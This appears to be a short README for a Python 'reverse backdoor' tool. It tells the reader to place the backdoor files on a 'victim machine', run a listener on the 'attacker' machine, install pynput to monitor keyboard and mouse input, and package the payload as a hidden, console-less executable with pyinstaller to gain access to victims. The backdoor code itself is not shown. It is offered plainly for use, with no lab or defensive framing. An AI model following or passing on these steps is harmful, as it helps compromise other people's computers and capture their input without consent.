# Reverse Backdoor
## Required Library:
### pynput
Allows us to control and monitor input devices(mouse,keyboard).

## Install with cmd in admin mode:
pip install pynput

# hackerip.py (Main file to run in victim or target machine.)
This starts the backdoor process
### Remember both rbackdoor.py and hackerip.py files must be in the victim machine to work this.


# listener.py (run this file on the attacker or hacker machine to listen )
This waits for the victim for connection.

## To convert .py files to .exe 
Install pyinstaller:
### pip install pyinstaller

## Finally, convert hackerip.py to .exe using the command ( the output .exe file can be used to get access to the victim mahcine):
### pyinstaller hackerip.py --onefile --noconsole



